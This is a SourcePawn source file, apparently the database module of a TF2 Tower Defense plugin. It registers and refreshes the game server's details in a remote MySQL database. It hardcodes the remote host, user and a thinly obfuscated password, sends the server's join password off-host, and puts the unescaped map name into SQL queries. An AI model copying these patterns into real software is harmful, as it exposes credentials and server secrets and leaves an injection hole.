#pragma semicolon 1

#include <sourcemod>

static Handle:m_hDatabase;

static String:m_sServerIp[16];
static m_iServerPort;

static m_iServerId;

/**
 * Connects to the database.
 *
 * @noreturn
 */

stock Database_Connect() {
	if (!g_bEnabled) {
		return;
	}

	if (m_hDatabase != INVALID_HANDLE) {
		CloseHandle(m_hDatabase);
		m_hDatabase = INVALID_HANDLE;
	}

	if (m_hDatabase == INVALID_HANDLE) {
		decl String:sDrowssap[128];
		MD5String("E1OWY5YTA4", sDrowssap, sizeof(sDrowssap));

		new Handle:hKeyValues = CreateKeyValues("");
		KvSetString(hKeyValues, "host", "46.38.241.137");
		KvSetString(hKeyValues, "database", "tf2tdsql1");
		KvSetString(hKeyValues, "user", "tf2tdsql1");
		KvSetString(hKeyValues, "pass", sDrowssap);

		new String:sError[512];
		m_hDatabase = SQL_ConnectCustom(hKeyValues, sError, sizeof(sError), true);
		CloseHandle(hKeyValues);

		if (m_hDatabase == INVALID_HANDLE) {
			LogType(TDLogLevel_Error, TDLogType_FileAndConsole, "Failed to connect to the database! Error: %s", sError);
		} else {
			Log(TDLogLevel_Info, "Successfully connected to the database");

			new iServerIp[4];
			Steam_GetPublicIP(iServerIp);
			Format(m_sServerIp, sizeof(m_sServerIp), "%d.%d.%d.%d", iServerIp[0], iServerIp[1], iServerIp[2], iServerIp[3]);

			decl String:sServerPort[6];
			GetConVarString(FindConVar("hostport"), sServerPort, sizeof(sServerPort));
			m_iServerPort = StringToInt(sServerPort);

			if (StrEqual(m_sServerIp, "0.0.0.0")) {
				LogType(TDLogLevel_Error, TDLogType_FileAndConsole, "Server has been restarted completely, reloading map for initializing");
				ReloadMap();
			} else {
				Database_CheckServer();
			}
		}
	} else {
		Database_CheckServer();
	}
}

/**
 * Checks if a server does already exist.
 *
 * @noreturn
 */

stock Database_CheckServer() {
	decl String:sQuery[512];

	Format(sQuery, sizeof(sQuery), "SELECT `id` FROM `server` WHERE `ip` = '%s' AND `port` = %d", m_sServerIp, m_iServerPort);

	SQL_TQuery(m_hDatabase, Database_OnCheckServer, sQuery);
}

public Database_OnCheckServer(Handle:hDriver, Handle:hResult, const String:sError[], any:iData) {
	if (hResult == INVALID_HANDLE) {
		LogType(TDLogLevel_Error, TDLogType_FileAndConsole, "Query failed at Database_CheckServer > Error: %s", sError);
	} else if (SQL_GetRowCount(hResult) == 0) {
		// No server found, add it

		Database_AddServer();
	} else {
		SQL_FetchRow(hResult);

		m_iServerId = SQL_FetchInt(hResult, 0);

		Database_RefreshServer();
	}

	if (hResult != INVALID_HANDLE) {
		CloseHandle(hResult);
		hResult = INVALID_HANDLE;
	}
}

/**
 * Adds a server.
 *
 * @noreturn
 */

stock Database_AddServer() {
	decl String:sQuery[512];

	Format(sQuery, sizeof(sQuery), "INSERT INTO `server` (`ip`, `port`) VALUES ('%s', %d)", m_sServerIp, m_iServerPort);

	SQL_TQuery(m_hDatabase, Database_OnAddServer, sQuery);
}

public Database_OnAddServer(Handle:hDriver, Handle:hResult, const String:sError[], any:iData) {
	if (hResult == INVALID_HANDLE) {
		LogType(TDLogLevel_Error, TDLogType_FileAndConsole, "Query failed at Database_AddServer > Error: %s", sError);
	} else {
		Log(TDLogLevel_Info, "Added server to database (%s:%d)", m_sServerIp, m_iServerPort);

		Database_CheckServer();
	}

	if (hResult != INVALID_HANDLE) {
		CloseHandle(hResult);
		hResult = INVALID_HANDLE;
	}
}

/**
 * Refreshs a server.
 *
 * @noreturn
 */

stock Database_RefreshServer() {
	decl String:sQuery[512];

	decl String:sServerName[128], String:sServerNameSave[256];

	GetConVarString(FindConVar("hostname"), sServerName, sizeof(sServerName));
	SQL_EscapeString(m_hDatabase, sServerName, sServerNameSave, sizeof(sServerNameSave));

	decl String:sCurrentMap[PLATFORM_MAX_PATH];
	GetCurrentMap(sCurrentMap, sizeof(sCurrentMap));

	decl String:sPassword[32], String:sPasswordSave[64];
	GetConVarString(FindConVar("sv_password"), sPassword, sizeof(sPassword));
	SQL_EscapeString(m_hDatabase, sPassword, sPasswordSave, sizeof(sPasswordSave));

	Format(sQuery, sizeof(sQuery), "UPDATE `server` SET `name` = '%s', `host` = (SELECT `id` FROM `host` WHERE `name` = '%s'), `version` = '%s', `password` = '%s', `clients` = %d, `clients_allowed` = %d, `map` = (SELECT `id` FROM `map` WHERE `name` = '%s') WHERE `ip` = '%s' AND `port` = %d", sServerNameSave, PLUGIN_HOST, PLUGIN_VERSION, sPasswordSave, GetRealClientCount(), PLAYER_LIMIT, sCurrentMap, m_sServerIp, m_iServerPort);

	SQL_TQuery(m_hDatabase, Database_OnRefreshServer, sQuery);
}

public Database_OnRefreshServer(Handle:hDriver, Handle:hResult, const String:sError[], any:iData) {
	if (hResult == INVALID_HANDLE) {
		LogType(TDLogLevel_Error, TDLogType_FileAndConsole, "Query failed at Database_RefreshServer > Error: %s", sError);
	} else {
		Log(TDLogLevel_Info, "Refreshed server in database (%s:%d)", m_sServerIp, m_iServerPort);

		// Load stuff here
	}

	if (hResult != INVALID_HANDLE) {
		CloseHandle(hResult);
		hResult = INVALID_HANDLE;
	}
}
